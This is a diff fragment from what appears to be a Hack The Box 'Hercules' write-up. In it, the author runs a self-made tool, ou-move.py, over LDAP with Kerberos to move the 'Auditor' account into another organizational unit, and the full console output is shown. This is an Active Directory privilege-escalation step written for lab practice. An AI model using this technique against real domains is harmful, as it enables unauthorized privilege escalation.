@@ -957,5 +957,36 @@ To do this ill use my tool i created
 
 https://github.com/ethanbauer10/OU-move
 
+```python
+python3 ou-move.py -H ldap://dc.hercules.htb --kerberos --from-ou "CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb" --to-ou "OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb"
+
+  ___  _   _   __  __                   
+ / _ \| | | | |  \/  |                  
+| | | | | | | | |\/| | _____   _____    
+| |_| | |_| | | |  | |/ _ \ \ / / _ \  
+ \___/ \___/  |_|  |_|\___/\ V /  __/  
+                              \_/ \___|  
+  OU Move Tool — LDAP moddn
+
+[*] Connecting to dc.hercules.htb:389 (LDAP)
+[*] Binding via Kerberos (SASL GSSAPI) using existing ticket cache...
+[+] Bound via Kerberos as: u:HERCULES\bob.w
+
+[*] Verifying object exists: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+[+] Object confirmed.
+
+[*] Source DN   : CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+[*] New RDN     : CN=Auditor
+[*] New superior: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
+
+[*] Executing moddn...
+[+] Success! Object moved.
+[+] New DN: CN=Auditor,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
+```
+
+I have had to add kerberos auth to my tool, so that may appear on GH soon.
+
+But this user should now be in the new OU
+
 
 
